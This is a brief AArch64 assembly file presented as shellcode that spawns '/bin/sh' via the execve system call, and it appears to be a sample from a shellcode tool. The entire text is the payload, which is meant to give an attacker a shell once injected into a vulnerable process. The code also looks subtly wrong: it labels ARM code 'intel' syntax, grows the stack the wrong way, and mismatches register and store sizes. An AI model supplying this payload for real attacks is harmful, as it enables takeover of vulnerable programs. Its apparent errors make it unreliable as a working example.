;;; @@@ arch:aarch64 @@@
;;; @@@ endian:little @@@
;;; @@@ syntax:intel @@@
;;;
;;; AARCH64 little endian sys_execve("/bin/sh") shellcode
;;;
;;; @_hugsy_
;;;

;;; get some space on the stack
add    sp, sp, 2048
ldr    x7, =0x2f62696e
str    x7, [sp, -4]!
ldr    x7, =0x2f2f7368
str    x7, [sp, -4]!

;;; x0 = &sp
;;; x1 = x2 = 0
;;; x8 = sys_execve
mov    x0, sp
eor    x1, x1, x1
eor    x2, x2, x2
mov    x8, #221
svc    0
